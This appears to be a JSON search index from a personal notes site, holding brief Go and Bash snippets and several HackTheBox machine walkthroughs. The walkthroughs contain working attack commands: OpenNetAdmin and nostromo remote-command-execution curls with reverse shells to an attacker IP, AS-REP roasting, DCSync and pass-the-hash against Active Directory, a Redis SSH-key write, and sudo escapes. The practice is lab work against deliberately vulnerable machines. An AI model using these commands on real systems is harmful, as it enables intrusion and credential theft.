[{"categories":null,"contents":" Hello World A sample go program is show here.\npackage main import \u0026#34;fmt\u0026#34; func main() { message := greetMe(\u0026#34;world\u0026#34;) fmt.Println(message) } func greetMe(name string) string { return \u0026#34;Hello, \u0026#34; + name + \u0026#34;!\u0026#34; } Run the program as below:\n$ go run hello.go Variables Normal Declaration:\nvar msg string msg = \u0026#34;Hello\u0026#34; Shortcut:\nmsg := \u0026#34;Hello\u0026#34; Constants const Phi = 1.618 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/basic/introduction/","summary":" Hello World A sample go program is show here.\npackage main import \u0026#34;fmt\u0026#34; func main() { message := greetMe(\u0026#34;world\u0026#34;) fmt.Println(message) } func greetMe(name string) string { return \u0026#34;Hello, \u0026#34; + name + \u0026#34;!\u0026#34; } Run the program as below:\n$ go run hello.go Variables Normal Declaration:\nvar msg string msg = \u0026#34;Hello\u0026#34; Shortcut:\nmsg := \u0026#34;Hello\u0026#34; Constants const Phi = 1.618 ","tags":null,"title":"Introduction"},{"categories":null,"contents":" Strings str := \u0026#34;Hello\u0026#34; Multiline string\nstr := `Multiline string` Numbers Typical types\nnum := 3 // int num := 3. // float64 num := 3 + 4i // complex128 num := byte(\u0026#39;a\u0026#39;) // byte (alias for uint8) Other Types\nvar u uint = 7 // uint (unsigned) var p float32 = 22.7 // 32-bit float Arrays // var numbers [5]int numbers := [...]int{0, 0, 0, 0, 0} Pointers func main () { b := *getPointer() fmt.Println(\u0026#34;Value is\u0026#34;, b) func getPointer () (myPointer *int) { a := 234 return \u0026amp;a a := new(int) *a = 234 Pointers point to a memory location of a variable. Go is fully garbage-collected.\nType Conversion i := 2 f := float64(i) u := uint(i) Slice slice := []int{2, 3, 4} slice := []byte(\u0026#34;Hello\u0026#34;) ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/basic/types/","summary":"Strings str := \u0026#34;Hello\u0026#34; Multiline string\nstr := `Multiline string` Numbers Typical types\nnum := 3 // int num := 3. // float64 num := 3 + 4i // complex128 num := byte(\u0026#39;a\u0026#39;) // byte (alias for uint8) Other Types\nvar u uint = 7 // uint (unsigned) var p float32 = 22.7 // 32-bit float Arrays // var numbers [5]int numbers := [...]int{0, 0, 0, 0, 0} Pointers func main () { b := *getPointer() fmt.","tags":null,"title":"Basic Types"},{"categories":null,"contents":" Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) Switch switch day { case \u0026#34;sunday\u0026#34;: // cases don\u0026#39;t \u0026#34;fall through\u0026#34; by default! fallthrough case \u0026#34;saturday\u0026#34;: rest() default: work() } Loop for count := 0; count \u0026lt;= 10; count++ { fmt.Println(\u0026#34;My counter is at\u0026#34;, count) } entry := []string{\u0026#34;Jack\u0026#34;,\u0026#34;John\u0026#34;,\u0026#34;Jones\u0026#34;} for i, val := range entry { fmt.Printf(\u0026#34;At position %d, the character %s is present\\n\u0026#34;, i, val) n := 0 x := 42 for n != x { n := guess() } ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/basic/flow-control/","summary":"Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) Switch switch day { case \u0026#34;sunday\u0026#34;: // cases don\u0026#39;t \u0026#34;fall through\u0026#34; by default! fallthrough case \u0026#34;saturday\u0026#34;: rest() default: work() } Loop for count := 0; count \u0026lt;= 10; count++ { fmt.Println(\u0026#34;My counter is at\u0026#34;, count) } entry := []string{\u0026#34;Jack\u0026#34;,\u0026#34;John\u0026#34;,\u0026#34;Jones\u0026#34;} for i, val := range entry { fmt.","tags":null,"title":"Flow Control"},{"categories":null,"contents":" Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/advanced/files/","summary":" Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) ","tags":null,"title":"File Manipulation"},{"categories":null,"contents":" Variable NAME=\u0026#34;John\u0026#34; echo $NAME echo \u0026#34;$NAME\u0026#34; echo \u0026#34;${NAME} Condition if [[ -z \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is empty\u0026#34; elif [[ -n \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is not empty\u0026#34; fi ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/bash/basic/","summary":" Variable NAME=\u0026#34;John\u0026#34; echo $NAME echo \u0026#34;$NAME\u0026#34; echo \u0026#34;${NAME} Condition if [[ -z \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is empty\u0026#34; elif [[ -n \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is not empty\u0026#34; fi ","tags":null,"title":"Bash Variables"},{"categories":null,"contents":"Nest Enumeration ","date":"June 26, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/nest/images/nest.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/nest/","summary":"Nest Enumeration ","tags":["HTB"],"title":"[HTB] Machine: Nest"},{"categories":null,"contents":"OpenAdmin Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.171 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 17:39 BST Nmap scan report for 10.10.10.171 (10.10.10.171) Host is up (0.19s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b98df85d17ef03dda48cdbc9200b754 (RSA) | 256 dceb3dc944d118b122b4cfdebd6c7a54 (ECDSA) |_ 256 dcadca3c11315b6fe6a489347c9be550 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 36.34 seconds gobuster └─$ gobuster dir -u http://10.10.10.171 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,txt,php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.171 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php,html [+] Timeout: 10s =============================================================== 2023/06/27 17:52:42 Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 277] /.php (Status: 403) [Size: 277] /index.html (Status: 200) [Size: 10918] /music (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.171/music/] /artwork (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.171/artwork/] /sierra (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.171/sierra/] /.php (Status: 403) [Size: 277] /.html (Status: 403) [Size: 277] Web server /ona\nIf you click login on /music page, it will redirect you to /ona page\nFoothold searchsploit Check exploit We can test it manually curl -s -d \u0026quot;xajax=window_submit\u0026amp;xajaxr=1574117726710\u0026amp;xajaxargs[]=tooltips\u0026amp;xajaxargs[]=ip%3D%3E;id\u0026amp;xajaxargs[]=ping\u0026quot; http://10.10.10.171/ona/ Let\u0026rsquo;s try reverse shell curl -s -d \u0026quot;xajax=window_submit\u0026amp;xajaxr=1574117726710\u0026amp;xajaxargs[]=tooltips\u0026amp;xajaxargs[]=ip%3D%3E;bash -c 'bash -i \u0026gt;%26 /dev/tcp/10.10.16.7/6666 0\u0026gt;%261'\u0026amp;xajaxargs[]=ping\u0026quot; http://10.10.10.171/ona/ User 1 Enumerating for privesc Started from local directory grep -inRE \u0026quot;*passwd*\u0026quot; . to search for config files with password Open mysql Before cracking let\u0026rsquo;s try su for password reuse with n1nj4W4rri0R! And it works for jimmy User 2 We see a folder owned by jimmy We see the source files Let\u0026rsquo;s check open ports Strange port 52846 And if apache or nginx was running (ona was hosted by apache) internal.openadmin.htb on port 52846 Let\u0026rsquo;s configure port forwarding via SSH Webshell We can create webshell php file and access it Let\u0026rsquo;s get reverse shell SSH If we read source code of internal we can see that after login we will get a joanna\u0026rsquo;s key And the creds for access are hardcoded I tried connecting with the key, but it was encrypted So I used john to find a passphrase bloodninjas Root Started with checking sudo rights GTFOBins Steps: sudo /bin/nano /opt/priv CTRL + R CTRL + X reset; sh 1\u0026gt;\u0026amp;0 2\u0026gt;\u0026amp;0 Rooted ","date":"June 26, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/openadmin/images/openadmin.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/openadmin/","summary":"OpenAdmin Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.171 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 17:39 BST Nmap scan report for 10.10.10.171 (10.10.10.171) Host is up (0.19s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b98df85d17ef03dda48cdbc9200b754 (RSA) | 256 dceb3dc944d118b122b4cfdebd6c7a54 (ECDSA) |_ 256 dcadca3c11315b6fe6a489347c9be550 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: OpenAdmin"},{"categories":null,"contents":"Sauna Enumeration ","date":"June 26, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/sauna/images/sauna.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/sauna/","summary":"Sauna Enumeration ","tags":["HTB"],"title":"[HTB] Machine: Sauna"},{"categories":null,"contents":"Traverxec Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.165 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 19:35 BST Nmap scan report for 10.10.10.165 (10.10.10.165) Host is up (0.096s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa99a81668cd41ccf96c8401c759095c (RSA) | 256 93dd1a23eed71f086b58470973a388cc (ECDSA) |_ 256 9dd6621e7afb8f5692e637f110db9bce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-server-header: nostromo 1.9.6 |_http-title: TRAVERXEC Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.10 seconds Web server gobuster └─$ gobuster dir -u http://10.10.10.165 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.165 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/27 19:39:09 Starting gobuster in directory enumeration mode =============================================================== /img (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.165/img/] /icons (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.165/icons/] /css (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.165/css/] /lib (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.165/lib/] /js (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.165/js/] Foothold From nmap results we see nostromo 1.9.6 Check searchsploit We can test poc It works Let\u0026rsquo;s get a reverse shell curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c \u0026quot;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.7/6666 0\u0026gt;\u0026amp;1\u0026quot;' User Let\u0026rsquo;s enumerate with linpeas Found .htpasswd and nhttpd.conf Starts hashcat, since it will take a while to crack echo 'david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' \u0026gt; david.hash hashcat -m 500 david.hash /usr/share/wordlists/rockyou.txt --username Resulted in david:Nowonly4me su doesn\u0026rsquo;t work In nhttpd.conf we can see homedirs parameter set to /home According to docs, it means that So we can visit http://10.10.10.165/~david/ From the config file we also saw that homedirs_public is set topublic_www Which means that there is public_www folder inside /home/david which probably can be accessed as www-data user I tried sending file via nc but it didn\u0026rsquo;t work Then I tried downloading it using wget since we have creds for david and config states that it uses .htpasswd for authentification After downloading tar file, we see that it contains david\u0026rsquo;s key Which is protected, so let\u0026rsquo;s crack it with john Let\u0026rsquo;s connect using the key Root Let\u0026rsquo;s enumerate for privesc again We see bin folder with script inside We see that journalctl is executed as sudo Thus david is a sudoer Let\u0026rsquo;s check GTFOBins So the trick here was that we need to shrink the terminal, so that journalctl will pipe stdout to less Based on script we have 5 lines We shrink terminal to less than 5 Output from the journalctl will be sent to less as root And we can type !/bin/bash to get us a root shell ","date":"June 26, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/traverxec/images/traverxec.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/traverxec/","summary":"Traverxec Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.165 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 19:35 BST Nmap scan report for 10.10.10.165 (10.10.10.165) Host is up (0.096s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa99a81668cd41ccf96c8401c759095c (RSA) | 256 93dd1a23eed71f086b58470973a388cc (ECDSA) |_ 256 9dd6621e7afb8f5692e637f110db9bce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-server-header: nostromo 1.","tags":["HTB"],"title":"[HTB] Machine: Traverxec"},{"categories":null,"contents":"Forest Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.161 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 16:32 BST Nmap scan report for 10.10.10.161 (10.10.10.161) Host is up (0.15s latency). Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-26 15:39:16Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h26m18s, deviation: 4h02m30s, median: 6m17s | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2023-06-26T15:39:27 |_ start_date: 2023-06-26T14:24:16 | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2023-06-26T08:39:24-07:00 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.94 seconds Dns No results with zone transfer Nothing on smb Let\u0026rsquo;s use the following post: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/ Foothold/User We got the following users Administrator sebastien lucinda svc-alfresco andy mark santi Let\u0026rsquo;s start with AS-REP Roasting impacket-GetNPUsers htb/ -dc-ip 10.10.10.161 -usersfile user.list -format hashcat -no-pass We got hash Let\u0026rsquo;s crack it: hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt Let\u0026rsquo;s connect evil-winrm -u 'svc-alfresco' -p 's3rvice' -i 10.10.10.161 Root Let\u0026rsquo;s enumerate domain using bloodhound I ran python version of the tool from the attack box: bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -dc forest.htb.local -ns 10.10.10.161 -c all --zip You can upload Sharphound to the box and run it to get the same results Start neo4j sudo neo4j start Launch bloodhound: bloodhound And import zip file svc-alfresco is a member of Service Accounts, which is a member of Privileged IT Accounts, which is a member of Account Operators, Thus svc-alfresco is a member of Account Operators. While Account Operators has Generic All privilege on the Exchange Windows Permissions group. According to the post: The Exchange Windows Permissions group has WriteDacl access on the Domain object in Active Directory, which means any member of the group can modify the domain privileges, such as the ability to perform DCSync, or synchronization operations by Domain Controllers. So we can perform dcsync attack $pass = ConvertTo-SecureString \u0026quot;Password123\u0026quot; -AsPlainText -Force New-ADUser pentest -AccountPassword $pass -Enabled $True Add-ADGroupMember -Identity \u0026quot;Exchange Windows Permissions\u0026quot; -members pentest $cred = New-Object system.management.automation.pscredential('htb\\pentest', $pass) Add-ObjectACL -PrincipalIdentity pentest -Credential $cred -Rights DCSync We need to perform these commands one by one And then perform dcsync impacket-secretsdump htb.local/pentest:Password123@10.10.10.161 -just-dc Connect using Administrator\u0026rsquo;s hash impacket-psexec htb.local/administrator@10.10.10.161 -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6' ","date":"June 24, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/forest/images/forest.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/forest/","summary":"Forest Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.161 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 16:32 BST Nmap scan report for 10.10.10.161 (10.10.10.161) Host is up (0.15s latency). Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-26 15:39:16Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.","tags":["HTB"],"title":"[HTB] Machine: Forest"},{"categories":null,"contents":"Postman Enumeration nmap Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 17:52 BST Nmap scan report for postman (10.10.10.160) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 46834ff13861c01c74cbb5d14a684d77 (RSA) | 256 2d8d27d2df151a315305fbfff0622689 (ECDSA) |_ 256 ca7c82aa5ad372ca8b8a383a8041a045 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: The Cyber Geek\u0026#39;s Personal Website |_http-server-header: Apache/2.4.29 (Ubuntu) 6379/tcp open redis Redis key-value store 4.0.9 10000/tcp open http MiniServ 1.910 (Webmin httpd) |_http-title: Site doesn\u0026#39;t have a title (text/html; Charset=iso-8859-1). |_http-server-header: MiniServ/1.910 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.20 seconds Web server Port 10000 Port 6379 redis-tools Foothold We can use this post as a guide So after trying several options I stopped on SSH: https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#ssh Generate key if you have not yet: ssh-keygen -b 2048 -t rsa Create a txt file from key: (echo -e \u0026quot;\\n\\n\u0026quot;; cat ~/.ssh/id_rsa.pub; echo -e \u0026quot;\\n\\n\u0026quot;) \u0026gt; key.txt Connect using id_rsa User We have another user Matt Found a key in /opt folder Which is encrypted Let\u0026rsquo;s use john But it doesn\u0026rsquo;t work If we check the config file for ssh, we see that the Matt\u0026rsquo;s connections are denied Luckily Matt reuses the password as ssh key password Root We saw that webmin is running as a root Let\u0026rsquo;s search exploits for webmin Login as Matt to webmin on port 10000 We can see the version Googling for exploits for that specific version will result in CVE-2019-12840 poc Let\u0026rsquo;s download poc and run it Rooted ","date":"June 24, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/postman/images/postman.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/postman/","summary":"Postman Enumeration nmap Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 17:52 BST Nmap scan report for postman (10.10.10.160) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 46834ff13861c01c74cbb5d14a684d77 (RSA) | 256 2d8d27d2df151a315305fbfff0622689 (ECDSA) |_ 256 ca7c82aa5ad372ca8b8a383a8041a045 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: The Cyber Geek\u0026#39;s Personal Website |_http-server-header: Apache/2.4.29 (Ubuntu) 6379/tcp open redis Redis key-value store 4.","tags":["HTB"],"title":"[HTB] Machine: Postman"},{"categories":null,"contents":"Stocker Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p20,80 -sC -sV 10.10.11.196 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 11:10 EDT Nmap scan report for 10.10.11.196 (10.10.11.196) Host is up (0.11s latency). PORT STATE SERVICE VERSION 20/tcp closed ftp-data 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://stocker.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.22 seconds I found nothing on default web page so I started ffuf for vhost enumeration ┌──(kali㉿kali)-[~] └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \u0026#39;Host: FUZZ.stocker.htb\u0026#39; -u http://stocker.htb -fs 178 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://stocker.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.stocker.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 178 ________________________________________________ [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 186ms] * FUZZ: dev :: Progress: [19966/19966] :: Job [1/1] :: 274 req/sec :: Duration: [0:01:00] :: Errors: 0 :: dev.stocker.htb The web stack Foothold / User So based on the web stack Express sometimes comes with NoSQL solutions So after trying few SQL injections, I had success with NoSQL ones https://book.hacktricks.xyz/pentesting-web/nosql-injection And we got access We can order items Let\u0026rsquo;s order a few and intercept requests Let\u0026rsquo;s run exiftool on pdf file It was generated by Skia/PDF m108 Let\u0026rsquo;s test a payload based on this post Looks like it worked Let\u0026rsquo;s exploit it Since it\u0026rsquo;s NodeJS, I wanted to check source code And we see hardcoded password Let\u0026rsquo;s ssh to box I used usernames gathered during the enumeration from the web server None worked Then using exploit above we see that there is angoose user and password works Root Enumerating box resulted in scripts folder and sudo rights Since we have * we can execuite any js script on this box So let\u0026rsquo;s create a malicious js For testing purposes as a template I used the current script Changed text.txt to root.txt And got a flag Which proves that we can execute any js as root, so we could either spawn a reverse shell or set suid bit for /bin/bash ","date":"June 24, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/stocker/images/stocker.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/stocker/","summary":"Stocker Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p20,80 -sC -sV 10.10.11.196 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 11:10 EDT Nmap scan report for 10.10.11.196 (10.10.11.196) Host is up (0.11s latency). PORT STATE SERVICE VERSION 20/tcp closed ftp-data 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://stocker.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB"],"title":"[HTB] Machine: Stocker"},{"categories":null,"contents":"Haystack Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.115 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 19:36 BST Nmap scan report for 10.10.10.115 (10.10.10.115) Host is up (0.55s latency). Not shown: 922 filtered tcp ports (no-response), 75 filtered tcp ports (host-unreach) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2a8de2928b14b63fe42f3a4743238b2b (RSA) | 256 e75a3a978e8e728769a30dd100bc1f09 (ECDSA) |_ 256 01d259b2660a9749205f1c84eb81ed95 (ED25519) 80/tcp open http nginx 1.12.2 |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: nginx/1.12.2 9200/tcp open http nginx 1.12.2 |_http-title: Site doesn\u0026#39;t have a title (application/json; charset=UTF-8). | http-methods: |_ Potentially risky methods: DELETE |_http-server-header: nginx/1.12.2 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 89.56 seconds Web server Port 9200 Foothold Let\u0026rsquo;s download the image and check it Run: file needle.jpg xxd needle.jpg strings needle.jpg You will notice a base64 string Nothing else Let\u0026rsquo;s check elasticsearch curl http://10.10.10.115:9200/_cat/indices?v Let\u0026rsquo;s check bank and quotes indeces curl -s -X GET \u0026quot;http://10.10.10.115:9200/bank/_search?size=1000\u0026quot; | jq -c '.hits.hits[]' curl -s -X GET \u0026quot;http://10.10.10.115:9200/quotes/_search?size=1000\u0026quot; | jq -c '.hits.hits[]' We don\u0026rsquo;t find a clue that we had from image in bank index But we find it in quotes Let\u0026rsquo;s decode them SSH to box as security User Enumerate for privesc So let\u0026rsquo;s port forward 5601 ssh -L 5601:localhost:5601 security@10.10.10.115 We have a LFI in the kibana https://github.com/mpgn/CVE-2018-17246 Root We have a logstash running as root Let\u0026rsquo;s open conf files According to input.conf every 10 seconds checks /opt/kibana/logstash_* and inputs files to filter.conf which eventually get executed based on output.conf Let\u0026rsquo;s exploit the exec plugin by crafting the payload that passes the filter Launch listener and wait for connection Rooted ","date":"June 23, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/haystack/images/haystack.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/haystack/","summary":"Haystack Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.115 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 19:36 BST Nmap scan report for 10.10.10.115 (10.10.10.115) Host is up (0.55s latency). Not shown: 922 filtered tcp ports (no-response), 75 filtered tcp ports (host-unreach) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2a8de2928b14b63fe42f3a4743238b2b (RSA) | 256 e75a3a978e8e728769a30dd100bc1f09 (ECDSA) |_ 256 01d259b2660a9749205f1c84eb81ed95 (ED25519) 80/tcp open http nginx 1.","tags":["HTB"],"title":"[HTB] Machine: Haystack"},{"categories":null,"contents":"Heist Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.149 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-24 10:40 BST Nmap scan report for 10.10.10.149 (10.10.10.149) Host is up (0.10s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-title: Support Login Page |_Requested resource was login.php | 